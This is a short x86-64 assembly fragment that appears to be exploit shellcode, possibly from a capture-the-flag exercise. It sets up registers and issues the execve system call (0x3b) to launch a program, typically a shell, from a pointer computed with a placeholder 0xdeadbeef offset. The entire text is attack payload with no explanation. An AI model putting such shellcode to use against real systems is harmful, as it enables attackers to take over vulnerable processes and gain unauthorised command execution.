BITS 64;
xor    esi,esi
xor    edx, edx
add    rax,0xffffffffdeadbeef
xchg   rdi, rax
xchg   eax, ebx
mov    al,0x3b
syscall